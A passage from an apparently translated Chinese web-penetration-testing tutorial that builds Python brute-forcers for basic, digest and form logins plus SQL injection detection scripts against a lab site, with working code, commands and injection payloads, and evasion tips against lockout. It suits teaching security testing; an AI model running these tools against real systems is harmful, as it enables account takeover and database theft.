如果我们想让 BruteForcer 对资源进行截图，然后返回 200 状态码怎么办？让我们在下一节中看看。

# 对发现的资源进行截图

在这个简短的部分中，我们将学习如何从我们的 BruteForcer 自动截图。我们将看到为什么拍照可能有用，以及我们需要添加哪些库来使我们的脚本具备这种功能。最后，我们将运行一个新的 BruteForcer 并拍一些照片。

在本节中，我们想要实现什么？基本上，我们想对返回 200 状态码的每个资源进行截图。这将帮助我们加快大型应用程序的分析速度，或者在较短的时间内测试多个应用程序。

为此，我选择了 Python 的 selenium web driver（[`docs.seleniumhq.org`](http://docs.seleniumhq.org)）和 PhantomJS（[`phantomjs.org/`](http://phantomjs.org/)）。Selenium WebDriver 是一个用于自动化 Web 浏览器的工具，主要用于软件测试。Selenium WebDriver 将驱动 PhantomJS，它是一个无头浏览器，并且在 Python 中具有对 PhantomJS 功能的访问权限，本例中是截图功能。

但是我们也可以访问 DOM，这对于测试 DOM 注入非常有用。我已经在虚拟机中安装了 Selenium 和 PhantomJS 以方便培训。让我们看看如何将其添加到我们的 BruteForcer 中：

1.  回到我们的编辑器，打开`forzabruta-4.py`。我们将在`import`区域添加以下 selenium 库：

```py
import requests
from threading import Thread
import sys
import time
import getopt
import re
import md5
from termcolor import colored

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
```

1.  我们定义了我们要使用 PhantomJS 的能力：

```py
                    dcap = dict(DesiredCapabilities.PHANTOMJS)
```

1.  然后，我们使用这些能力实例化 WebDriver，并等待`2`秒，只是为了确保页面加载：

```py
                    driver = webdriver.PhantomJS(desired_capabilities=dcap)
                    time.sleep(2)
```

1.  我们定义了屏幕截图的大小，然后加载页面，最后将屏幕截图保存为`word.png`，并附上找到的结果的名称：

```py
                    driver.set_window_size(1024, 768)
                    driver.get(self.url)
                    driver.save_screenshot(self.word+".png")
```

简短而简单，对吧？现在让我们运行它。

让我们回到终端，并使用与之前相同的参数运行`forzabruta-4.py`。我们会看到一些延迟，但这是因为我们等待了几秒钟，以确保页面加载。现在，如果我们查看运行脚本的目录，我们应该会看到一些`.png`图像：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00048.jpeg)

让我们通过在桌面上选择 Examples 文件夹，然后点击 Section-4 | index.php.png 来打开`index.php.png`。这是`index.php`内容的屏幕截图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00049.jpeg)

index.php 的屏幕截图

然后，我们可以打开`robots.text.png`，最后是`test1.txt.png`。现在我们可以看到文件的内容。考虑到我们使用了两个工具来自动截取屏幕截图，这是非常有趣的：Selenium 让我们驱动 PhantomJS，而 PhantomJS 又让我们截取屏幕截图。

恭喜！现在你有了扩展 BruteForcer 并在将来可能需要的任何内容的知识。一些建议进一步发展的内容包括按`行`、`单词`、`字符`和`MD5`进行过滤，当检测到目录时添加递归，并生成结果的 HTML 报告。

# 摘要

在这一部分，我们学习了如何编写一个 BruteForcer 工具，它将帮助我们发现和枚举文件、目录和参数等资源。我们看到了如何添加过滤功能，以及如何扩展这一功能，以帮助我们过滤响应并识别感兴趣的内容。最后，我们看到了如何使用 Selenium 和 PhantomJS 自动截取屏幕截图。

在第五章，*密码测试*中，我们将学习有关密码质量测试，也称为密码破解。


# 第五章：密码测试

在第四章，*资源发现*中，我们学习了如何编写一个基本的 Web 应用程序 BruteForcer 来帮助我们进行资源发现。

在本章中，我们将学习以下内容：

+   密码攻击的工作原理

+   我们的第一个密码破解器

+   支持摘要身份验证

+   基于表单的身份验证

# 密码攻击的工作原理

在本节中，我们将看看密码破解是什么；它也被称为密码测试。我们将介绍进行密码破解时可以采取的不同方法，最后，我们将学习密码策略和帐户锁定，这在计划密码攻击时很重要。

# 密码破解

密码破解是针对 Web 应用程序的最常见的暴力攻击类型。这是对登录凭据的攻击，它利用了密码通常较弱的事实，因为用户需要记住它们并且需要一个难以猜测的单词。

密码破解通常使用已知单词的字典，或者更确切地说，使用广泛使用的密码列表。这些列表是通过从不同在线服务的密码泄露列表中获取最常用的密码而创建的。密码列表还可能包括单词的变体，例如通过用数字替换字母生成的变体，比如用零替换 O，用一替换 I。

当我们计划进行密码攻击时，我们有不同的选择：

+   **垂直扫描**：最常见且最常用的是垂直扫描，它使用一个用户名并尝试字典中的所有密码。

+   **水平扫描**：这基本上是垂直扫描的相反。它使用一个密码并对所有用户名进行测试。通常这样做是为了防止在多次无效登录尝试后锁定帐户。

+   **对角线扫描**：每次混合不同的用户名和密码，减少用户被检测或阻止的可能性。

+   **三维扫描**：有时，对角线扫描不够，我们需要进一步防止被检测。这就是三维扫描发挥作用的时候。这是水平、垂直或对角线的组合，但在这种情况下，我们有多台机器可以在上面启动我们的请求，或者 HTTP 代理可以允许我们为每个请求使用不同的源 IP。

+   **四维扫描**：这在源 IP 旋转或分发的基础上增加了每个请求的时间延迟。

# 密码策略和帐户锁定

密码策略是一组旨在通过鼓励用户使用强密码并正确使用它们来增强计算机安全性的规则。

密码策略可以是建议性的，也可以是强制性的，例如通过技术手段，比如在帐户创建时强制执行，或者在需要更改密码时强制执行。密码策略可以规定密码的长度、大小写敏感性、小写和大写字母的混合、允许的字符、数字和符号、过去密码的重复使用、不能使用的先前密码数量、黑名单密码，以及非常容易猜测的单词和组合，如**password**和**123456**。

此外，密码策略还可以定义诸如需要多频繁更改密码以及在 X 次错误尝试后锁定帐户等事项。因此，现在我们了解了密码策略的工作原理。当我们启动密码破解测试时，我们必须小心，因为我们可能会封锁数千个帐户，这可能意味着渗透测试的结束和一些问题。

未经授权进行此操作是非法的。

# 我们的第一个密码破解器

在本节中，我们将看看基本身份验证是什么，它是如何工作的，然后我们将为这种方法创建我们的第一个密码破解器。最后，我们将对我们的受害者 Web 应用程序测试脚本。

# 基本身份验证

基本身份验证是强制访问控制到 Web 应用程序资源的最简单的技术之一。它通过添加特殊的 HTTP 头来实现，这是不安全的，因为凭据被使用 Base64 方法编码后发送。编码意味着它可以很容易地被反转。例如，我们可以看到基本身份验证头是什么样子的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00050.jpeg)

编码字符串可以被解码，我们发现发送的密码等于`admin123`。

通常，当你看到以等号结尾的字符串时，它可能是一个 base64 编码的字符串。

# 创建密码破解器

让我们创建我们的密码破解器：

1.  让我们回到 Atom 编辑器，打开`back2basics.py`文件。在`Section-5`中，我们可以看到在`import`区域，我们没有任何新的内容，脚本的结构与之前的相似。

1.  我们有一个`start`函数，它将显示`banner`，并传递命令行并读取参数——相同的参数，除了现在有`user`参数。然后，它将使用变量`passwords`、`threads`、`user`和`url`调用函数`launcher_thread`，这些变量对应于密码字典、线程数、要使用的用户名和目标 URL：

```py
def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "u:w:f:t:")
    except getopt.GetoptError:
        print "Error en arguments"
        sys.exit()

    for opt, arg in opts:
        if opt == '-u':
            user = arg
        elif opt == '-w':
            url = arg
        elif opt == '-f':
            dictio = arg
        elif opt == '-t':
            threads = arg
    try:
        f = open(dictio, "r")
        name = f.readlines()
    except:
        print"Failed opening file: " + dictio + "\n"
        sys.exit()
    launcher_thread(name, threads, user, url)
```

1.  然后，在`launcher_thread`中，我们有一个`while`循环，直到密码数组中没有任何单词为止：

```py
def launcher_thread(names, th, username, url):
    global i
    i = []
    i.append(0)
    while len(names):
        if hit == "1":
            try:
                if i[0] < th:
                    n = names.pop(0)
                    i[0] = i[0] + 1
                    thread = request_performer(n, username, url)
                    thread.start()

            except KeyboardInterrupt:
                print "Brute forcer interrupted by user. Finishing attack.."
                sys.exit()
            thread.join()
        else:
            sys.exit()
    return
```

因此，对于数组中的每个单词，我们都执行`pop`，然后用`n`、`username`和`url`实例化`request_performer`类。

1.  在`request_performer`中，我们为对象定义了一些属性，然后执行 GET 请求：

```py
class request_performer(Thread):
    def __init__(self, name, user, url):
        Thread.__init__(self)
        self.password = name.split("\n")[0]
        self.username = user
        self.url = url
        print "-" + self.password + "-"

    def run(self):
        global hit
        if hit == "1":
            try:
                r = requests.get(self.url, auth=(self.username, self.password))
                if r.status_code == 200:
                    hit = "0"
                    print "[+] Password found - " + colored(self.password, 'green') + " - !!!\r"
                    sys.exit()
                else:
                    print "Not valid " + self.password
                    i[0] = i[0] - 1 # Here we remove one thread from the counter
            except Exception, e:
                print e
```

这里重要的部分是`auth`参数，它告诉请求使用提供的用户名和密码进行基本身份验证。

然后，如果状态是`200`，我们打印出找到并使用的密码。我们使用变量`hit`来确定是否找到了有效密码，并停止发送请求。

就是这样；现在，我们有了我们的第一个基本身份验证暴力破解器。让我们试试看。

在运行之前，记住上一节，当我们发现不同的目录时，有一个返回状态码 401 的目录？这意味着它正在请求身份验证。

目录是`/Admin`，当我们尝试访问它时，我们可以看到身份验证弹出窗口：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00051.jpeg)

让我们去终端。我们将使用以下命令行运行它：

```py
python back2basics.py -w http://www.scruffybank.com/Admin -u admin -t 5 -f pass.txt
```

这很简单，但这只是为了演示目的。我们可以看到在这种情况下用户`admin`的密码是`administrator`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00052.jpeg)

让我们在网站上试试看。你会看到它是有效的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00053.jpeg)

现在，你知道如何在 Web 应用程序中执行基本身份验证密码测试了。

# 添加对摘要身份验证的支持

在这一部分，我们将开始学习摘要身份验证是什么。然后，我们将修改我们的密码破解器以支持这种方法，最后，我们将测试新脚本对我们的测试 Web 应用程序的效果。

# 什么是摘要身份验证？

摘要身份验证是基本身份验证的更安全选项。它使用 MD5 对用户名和密码加上一个随机数进行哈希处理。**随机数**用于防止重放攻击，并在用户请求受保护的资源后由服务器发送。浏览器使用以下代码创建响应：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00054.jpeg)

最后，响应是**HA1**随机数**HA2**的**MD5**哈希。领域值定义了一个保护空间。如果凭据适用于一个领域中的页面，它们也将适用于该领域中的其他页面。现在，让我们为我们的脚本添加对摘要的支持。

# 将摘要身份验证添加到我们的脚本中

让我们回到我们的编辑器，打开`back2digest.py`文件。我们添加了几行以支持摘要身份验证。首先，我们添加了这个导入：

```py
from requests.auth import HTTPDigestAuth
```

上述代码允许我们选择身份验证。在`request_performer`中，我们需要添加一个条件来检查用户是否选择运行`digest`身份验证攻击还是`basic`：

```py
                if self.method == "basic":
                    r = requests.get(self.url, auth=(self.username, self.password))
                elif self.method == "digest":
                    r = requests.get(self.url, auth=HTTPDigestAuth(self.username, self.password))
```

我们在请求实例化中指定不同的方法。在`digest`的情况下，稍有不同，因为我们需要在`auth`参数中指定`HTTPDigestAuth`。此外，我们需要在`start`函数中添加新参数的处理程序，在`getopt`函数中添加`-m`，新参数将管理身份验证方法的类型。然后我们将它添加到每个函数作为变量。

就是这样。我们应该能够针对受摘要保护的资源进行测试。让我们试试看。

让我们回到终端，但首先，让我们检查`robot.txt`中找到的资源`backoffice`。我们可以看到它需要身份验证，并且对用户来说与基本身份验证完全相同：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00055.jpeg)

让我们查看服务器发送给我们的响应的标头。单击 Mozilla 浏览器右侧的打开菜单选项，选择 Developer | Network，然后单击 Reload 按钮。取消所需的身份验证窗口，然后选择如下屏幕截图所示的行。我们可以看到有一个带有`Digest realm`参数的 WWW- Authenticate 标头，`nonce`和`algorithm= MD5`。所以让我们去控制台运行我们的脚本：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00056.jpeg)

让我们针对后台目录运行它。我们使用与之前相同的参数运行`back2digest.py`，但是我们将资源更改为`/backoffice`而不是`/admin`：

```py
python back2digest.py -w http://www.scruffybank.com/backoffice -u administrator -t 5 -f pass.txt -m digest
```

我们将用户更改为`administrator`，保持`5`个线程和相同的字典`pass.text`，最后，指示`digest`的新参数方法，然后运行它：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00057.jpeg)

这次没有运气。没有一个组合是有效的；也许用户不存在。让我们尝试另一个用户，例如`admin`。让我们运行它。

太好了，我们找到了用户`admin`的密码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00058.jpeg)

现在让我们在浏览器中尝试一下。将用户名设置为`admin`，密码设置为`admin123`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00059.jpeg)

完美，我们成功了。这里没有太多可看的。现在你有了可以进行基本和摘要身份验证的密码破解器。恭喜！让我们继续添加更多功能。

# 基于表单的身份验证

在这一部分，我们将学习如何在 Web 应用程序中暴力破解基于表单的身份验证。我们将开始学习什么是基于表单的身份验证，然后我们将修改我们之前的工具之一，以启用此攻击。最后，我们将测试我们的脚本针对受害者 Web 应用程序，并对其进行微调以改进结果。

# 基于表单的身份验证概述

让我们从对基于表单的身份验证的快速概述开始。基于表单的身份验证是 Web 应用程序中最常见和广泛使用的身份验证方法。

这种方法与我们之前学到的两种方法不同，这意味着此方法的实现将有所不同。基本上，Web 应用程序将呈现一个表单，提示用户输入用户名和密码。然后，这些数据将发送到服务器进行评估，如果凭据有效，它将为用户提供有效的会话 cookie，并允许用户访问受保护的资源。

让我们将这添加到我们之前的脚本中。所以，你可能在等我说让我们回到编辑器并打开之前的脚本，但不是。让我们停下来一分钟，评估我们在这里的最佳选择是什么。我们将处理表单，并且没有关于如何处理表单上的身份验证的标准，因此我们需要有很好的过滤来筛选出不正确的尝试，并能够识别出好的尝试。

因此，我们不是将所有过滤代码添加到先前的脚本中，而是将`post`处理和`payload`处理添加到`第 5 节`的`forzaBruta-forms.py`脚本中。因此，现在，返回编辑器并打开文件。让我们开始添加代码，使其能够暴力破解登录表单。

我们不添加新的`import`。我们可以转到`start`函数，并添加`getopt`函数来处理`post` `payload`：

```py
def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, "w:f:t:p:c:")
    except getopt.GetoptError:
        print "Error en arguments"
        sys.exit()
    hidecode = 000
    payload = ""
    for opt, arg in opts:
        if opt == '-w':
            url = arg
        elif opt == '-f':
            dict = arg
        elif opt == '-t':
            threads = arg
        elif opt == '-p':
            payload = arg
        elif opt == '-c':
            hidecode = arg
    try:
        f = open(dict, "r")
        words = f.readlines()
    except:
        print"Failed opening file: " + dict + "\n"
        sys.exit()
    launcher_thread(words, threads, url, hidecode, payload)
```

在这种情况下，它将是`-p`。如果存在`-p`，我们将其值分配给`payload`变量。我们将`payload`传递给`launcher_thread`。

然后，在`launcher_thread`中，我们再次将其传递给`request_performer`：

```py
def launcher_thread(names, th, url, hidecode,payload):
    global i
    i = []
    resultlist = []
    i.append(0)
    print "-----------------------------------------------------------------------------------------------------------------------------------"
    print "Time" + "\t" + "\t code \t\tchars\t\twords\t\tlines"
    print "-----------------------------------------------------------------------------------------------------------------------------------"
    while len(names):
        try:
            if i[0] < th:
                n = names.pop(0)
                i[0] = i[0] + 1
                thread = request_performer(n, url, hidecode, payload)
                thread.start()

        except KeyboardInterrupt:
            print "ForzaBruta interrupted by user. Finishing attack.."
            sys.exit()
        thread.join()
    return

if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print "ForzaBruta interrupted by user, killing all threads..!!"
```

我们将`payload`添加到`request_performer`的`init`函数中。

然后，我们检查 payload 是否为空。如果不为空，我们用字典词替换关键字`FUZZ`，否则我们不会触及它，保持原样：

```py
class request_performer(Thread):
    def __init__(self, word, url, hidecode, payload):
        Thread.__init__(self)
        self.word = word.split("\n")[0]
        self.url = url.replace('FUZZ', self.word)
        if payload != "":
            self.payload = payload.replace('FUZZ', self.word)
        else:
        self.payload=payload
        self.hidecode = hidecode
```

然后，我们转到`run`方法，我们需要一个条件来告诉我们何时使用`post`和何时使用`get`。我们可以通过检查`self.payload`是否为空来做到这一点，如果为空，我们使用`get`：

```py
    def run(self):
        try:
            start = time.time()
            if self.payload == "":
                 r = requests.get(self.url)
                 elaptime = time.time()
                 totaltime = str(elaptime - start)[1:10]
```

如果不为空，我们将使用`post`请求。

对于`post`请求，我们需要以字典形式的 payload：

```py
            else:
                list=self.payload.replace("="," ").replace("&"," ").split(" ")
                payload = dict([(k, v) for k,v in zip (list[::2], list[1::2])])
                r = requests.post(self.url, data = payload)
                elaptime = time.time()
                totaltime = str(elaptime - start)[1:10]
```

现在，我们将其作为一个带有`&`和`=`符号的字符串，所以我们将用一个空格替换符号，然后我们将使用空格拆分字符串，创建一个元素列表。

然后，我们使用该 payload 创建一个`post`请求，这些都是执行登录表单密码暴力破解所需的所有更改。现在，测试它对我们的受害者 Web 应用程序将是很好的。让我们来做吧。

我们如何设置对表单的暴力攻击？让我们打开一个具有登录表单的页面，在我们的情况下是`www.scruffybank.com/login.php`。

我们右键单击页面，然后选择查看页面源代码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00060.jpeg)

现在，我们需要找到表单操作，也就是凭证将被发送以进行验证的地方。在这种情况下，它是`check_login.php`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00061.jpeg)

我们还需要变量的名称，在这种情况下是`username`和`password`。

这就是我们设置攻击所需的数据。

让我们返回终端，并使用以下命令行运行脚本，`forzaBruta-forms.py`，后跟相同的 URL。这次，我们将登录更改为`check_login.php`。我们将线程保留为`5`。在这种情况下，我们在`post`的`payload`中有`username`和`password`参数：

```py
python forzaBruta-forms.py -w http://www.scruffybank.com/check_login.php -t 5 -f pass.txt -p "username=admin&password=FUZZ"
```

我们需要用`&`连接参数。`weaksource.txt`是人们在不同服务中使用的最弱密码的列表。现在，让我们启动它。我们可以看到所有结果都是`302`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00062.jpeg)

因此，按代码进行过滤对我们没有帮助。我们可以过滤掉等于`2373`的`chars`，这是我们知道的失败尝试。

让我们修改代码，以过滤`chars`而不是使用命令行参数`-c`过滤代码。我们将代码更改为按`chars`进行过滤。这样做，我们可以在不修改太多代码的情况下按`chars`进行过滤。返回编辑器，修改行`self.hidecode !=code`为`self.hidecode != chars:`：

```py
            if self.hidecode != chars:
                if '200' <= code < '300':
                    print totaltime + "\t" + colored(code,'green') + " \t\t" + chars + " \t\t" + words + " \t\t " + lines +"\t" + r.headers["server"] + "\t" + self.word
                elif '400' <= code < '500':
                    print totaltime + "\t" + colored(code,'red') + " \t\t" + chars + " \t\t" + words + " \t\t " + lines + "\t" + r.headers["server"] + "\t" + self.word
                elif '300' <= code < '400':
                    print totaltime + "\t" + colored(code,'blue') + " \t\t" + chars + " \t\t" + words + " \t\t " + lines + "\t"+ r.headers["server"] + "\t" + self.word
            else:
                pass
            i[0] = i[0] - 1 # Here we remove one thread from the counter
        except Exception, e:
            print e
```

让我们保存这个。现在，我们更改命令行以添加`-c 2373`来过滤所有结果，并再次运行它：

```py
python forzaBruta-forms.py -w http://www.scruffybank.com/check_login.php -t 5 -f pass.txt -p "username=admin&password=FUZZ" -c 2373
```

好的。我们有我们的用户名和密码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00063.jpeg)

恭喜，现在您知道如何测试密码安全性，针对三种最常见的 Web 应用程序身份验证方法！在本节中，我们还利用了以前的工作。

# 总结

在本章中，我们学习了 Web 应用程序中常用的不同身份验证方法，并创建了一个用于测试基本和摘要身份验证的工具。最后，我们创建了一个登录表单身份验证 BruteForcer。

在第六章中，*检测和利用 SQL 注入漏洞*，我们将学习如何检测和利用 SQL 注入漏洞。


# 第六章：检测和利用 SQL 注入漏洞

在第五章，*密码测试*中，我们了解了不同的身份验证方法，并创建了一个密码暴力破解工具。在本章中，我们将学习可能影响 Web 应用程序的最危险的漏洞之一，**SQL 注入**（**SQLi**）。

在本章中，我们将看一下：

+   SQL 注入简介

+   检测 SQL 注入问题

+   利用 SQL 注入提取数据

+   高级 SQLi 利用

# SQL 注入简介

什么是 SQL 注入？这是一种输入操纵漏洞。顾名思义，这是一种漏洞，攻击者通过操纵 Web 应用程序来向应用程序数据库中注入任意的 SQL 代码。这种漏洞主要影响使用 DB 存储和检索数据的 Web 应用程序。

如今，大多数 Web 应用程序使用 DB，因此受此漏洞影响的联合 Web 应用程序数量庞大。这个问题的主要原因是当 Web 应用程序使用来自不受信任来源的数据动态构造 SQL 查询时。如果注入成功，攻击者可以：

+   提取任意数据

+   将篡改的数据插入数据库

+   绕过身份验证授权和访问控制

+   通过执行操作系统命令来控制服务器

正如你所看到的，它允许你在 Web 应用程序中做很多事情，对于攻击者来说，这是相当不错的。

想象我们的 Web 应用程序中有一个登录表单。这个登录表单将由我们的服务器端代码处理，它将从`POST`内容中获取用户名和密码。它将分配给变量，一个名字和一个密码。然后，这两个变量将用于动态构造 SQL 语句：

```py
$name=$_POST("UserName");
$pass=$_POST("UserPass");

sql="SELECT * FROM Users WHERE Username='$name' and password='$pass'"

sql="SELECT * FROM Users WHERE Username='admin' and password='superRoot'"
```

当我们的用户提供有效的用户名和密码，如`admin`和`superRoot`时，登录将成功。但如果用户提供特殊字符和结构作为输入，会发生什么？

让我们想象同样的例子，但这次攻击者将`'`或`1=1`插入为用户名和密码。这里会发生什么？生成的 SQL 查询是有效的。它将从用户表中返回所有行，因为`1=1`始终为真。这意味着它将返回用户表中的所有结果：

```py
$name=$_POST("UserName");
$pass=$_POST("UserPass");

sql="SELECT * FROM Users WHERE Username='$name' and password='$pass'"

sql="SELECT * FROM Users WHERE Username='' or '1'='1'' and password='' or '1'='1''"
```

在这个登录界面的情况下，它将使用表的第一个用户将攻击者登录。很多时候，第一个用户是`admin`，除非有一些名为`Aaron`和`Charl`等用户。

# SQLi 与盲 SQLi

当 Web 应用程序容易受到 SQL 注入攻击，但攻击者看不到注入的结果时，称为盲 SQLi。

管理员、开发人员和框架正在处理错误，以避免泄露信息。当攻击者看不到结果或错误时，我们仍然有一些方法可以帮助以盲目的方式利用 SQL 注入。它们是：

+   **布尔**：这种方法是基于注入有效负载，改变原始查询的结果，导致返回不同的页面内容

+   **基于时间的**：这种方法是基于注入有效负载，触发 SQL 服务器在处理我们的查询时出现延迟时间，从而减慢我们请求的响应时间

我们稍后将更详细地了解这些技术。

# 检测 SQL 注入问题

在本节中，我们将学习如何检测 SQL 注入以及如何在 Python 中进行交替。我们将研究在 Web 应用程序中检测 SQLi 的不同方法。然后，我们将根据其中一种方法自动检测这些问题。最后，我们将列举查询中使用的列，并识别表中的有效列名。

# 检测 SQLi 的方法

为了检测 SQLi，我们有三种可用的方法：

+   **基于错误的**：这种方法注入会打破原始查询并在服务器上生成 SQL 错误，可以在返回页面的内容中检测到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00064.jpeg)

+   **布尔**：这种方法注入会改变原始查询结果的有效负载，使应用程序返回不同的页面内容。基本上，我们将识别有效页面的大小与无效页面的大小，然后执行像我们在这里看到的布尔查询：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00065.jpeg)

如果数据库版本的第一个数字是`5`，我们将得到 ID 为`1008`的页面。如果不是，我们将得到错误页面。如果我们想要确切的数据库版本，我们需要自动化这个查询并猜测每个位置的值。

+   **基于时间的**：这种方法注入会触发 SQL 服务器在处理查询时的延迟。如果这种延迟足够大，并且网络中没有明显的滞后，我们可以判断查询是否正确执行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00066.jpeg)

# 自动化检测

让我们回到编辑器并打开`Section-6`中的`SQLinjector-0.py`。重要的是要强调所有的内容和脚本都是基于 MySQL 数据库的，并且只能在这个数据库上运行。

在`import`部分，我们有与第五章中使用的相同内容。然后，我们有典型的`banner`和`usage`函数：

```py
def banner():
  print "\n***************************************"
  print "* SQlinjector 1.0 *"
  print "***************************************"

def usage():
  print "Usage:"
  print " -w: url (http://somesite.com/news.php?id=FUZZ)\n"
    print " -i: injection strings file \n"
  print "example: SQLinjector.py -w http://www.somesite.com/news.php?id=FUZZ \n"
```

然后，我们有`start`函数，没有什么新的。然后，我们有常见的选项。我们有两个参数，一个是要测试的 URL，另一个是注入的字典：

```py
def start(argv):
    banner()
  if len(sys.argv) < 2:
       usage()
       sys.exit()
  try:
    opts, args = getopt.getopt(argv,"w:i:")
  except getopt.GetoptError:
    print "Error en arguments"
    sys.exit()
  for opt,arg in opts :
    if opt == '-w' :
      url=arg
    elif opt == '-i':
      dictio = arg
  try:
    print "[-] Opening injections file: " + dictio
    f = open(dictio, "r")
    name = f.read().splitlines()
  except:
    print"Failed opening file: "+ dictio+"\n"
    sys.exit()
  launcher(url,name)
```

然后，我们转到`launcher`函数。这将用输入文件中提供的所有`injection`字符串替换`FUZZ`标记：

```py
def launcher (url,dictio):
  injected = []
  for sqlinjection in dictio:
    injected.append(url.replace("FUZZ",sqlinjection))
  res = injector(injected)
  print "\n[+] Detection results:"
  print "------------------"
  for x in res:
    print x.split(";")[0]
```

然后它将调用`injector`并打印结果。`injector`函数是基于错误的下一个 SQL 注入：

```py
def injector(injected):
  errors = ['Mysql','error in your SQL']
  results = []
  for y in injected:
    print "[-] Testing errors: " + y
    req=requests.get(y)
    for x in errors:
      if req.content.find(x) != -1:
          res = y + ";" + x
          results.append(res)
  return results
```

为此，我们有一个错误数组，其中包含我们在`Mysql`错误中找到的有限数量的字符串。然后，我们执行`requests`，如果我们找到一个错误，我们将 URL 添加到结果数组中，最后将在 launcher 函数中打印出来。

所以，让我们尝试这个脚本。还记得我们在第四章中用我们的暴力脚本识别出来的有趣文件吗？有一个特别需要关注的文件。它是`/users.php`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00067.jpeg)

这个文件似乎接受一个输入并返回该用户 ID 的用户和行。让我们看看如果我们输入`1`会发生什么。你可以看到在这种情况下，我们得到了一个带有`ID: 1`，`Name: johnny`和`role: test`的响应：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00068.jpeg)

太棒了！让我们复制 URL 作为我们脚本的输入。

让我们去控制台并使用以下参数运行 SQL 注入器：

```py
python SQLinjector-0.py -w "http://www.scruffybank.com/users.php?id=FUZZ&Submit=Submit#" -i injections.txt
```

这些是我们从浏览器复制的 URL 和我们为此练习创建的注入文件。

接下来，按*Enter*：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00069.jpeg)

我们可以看到脚本检测到以下字符生成的 SQL 错误；单引号和括号。

我们可以检查浏览器以查看这些字符生成的错误。现在，在浏览器中，用`'`替换这个`1`并按*Enter*：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00070.jpeg)

我们可以看到当生成 SQL 错误时，我们可以操纵该查询。

让我们继续改进 SQL 注入脚本。

现在，打开脚本`SQLinjector-1.py`。你可以看到我们有两个新函数，`detect_columns`和`detect_columns_names`。

```py
def detect_columns(url):
  new_url= url.replace("FUZZ","admin' order by X-- -")
  y=1
  while y < 20:
    req=requests.get(new_url.replace("X",str(y)))
    if req.content.find("Unknown") == -1:
      y+=1
    else:
      break
  return str(y-1)

def detect_columns_names(url):
  column_names = ['username','user','name','pass','passwd','password','id','role','surname','address']
  new_url= url.replace("FUZZ","admin' group by X-- -")
  valid_cols = []
  for name in column_names:
    req=requests.get(new_url.replace("X",name))
    if req.content.find("Unknown") == -1:
      valid_cols.append(name)
    else:
      pass
  return valid_cols
```

`detect_columns`尝试识别在这个 select 语句中使用了多少列，以及我们试图操纵多少列。这些信息对于构建我们的 SQL 查询是很重要的。为了做到这一点，我们使用了 order by 技术。我们可以添加 order by `X`，其中`X`是一个数字。如果这个数字小于或等于列的数量，它将返回结果；如果不是，它将返回一个错误。因此，如果我们尝试这样做直到出现错误，这将意味着列的数量小于`X`。

让我们在浏览器中看一下。现在，我们尝试使用`a' order by 1`。我们需要用`-- -`结束查询以避免错误：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00071.jpeg)

用`1`，我们得到了结果。所以，他们至少使用了一列。让我们尝试三列。我们得到了`Unknown column '3' in 'order close'`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00072.jpeg)

这意味着少于三列。

在这种情况下，它将是`2`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00073.jpeg)

我们还有一个名为`detect_columns_names`的新函数。这个函数尝试识别 SQL 查询中使用的表中的有效列名。这很有用，因为它将帮助我们定制我们的查询以提取数据。我们将使用 group by 技术。我们添加`group by`和列的名称。如果它存在，它将返回有效的结果；如果不是，我们会得到一个错误。数组`column_names`中有一个有趣的列名列表，但实际上，你需要一个广泛的单词字典来识别尽可能多的列。

让我们在浏览器中看一个例子。这一次，我们将使用`group`，并且将`password`作为列名。

然后，我们按下*Enter*。我们可以看到它是有效的，我们得到了`admin`的结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-py-web-pentest/img/00074.jpeg)

但是如果我们使用`username`作为列名呢？我们可以在 group 语句中添加`username`。我们可以看到列`username`是无效的：

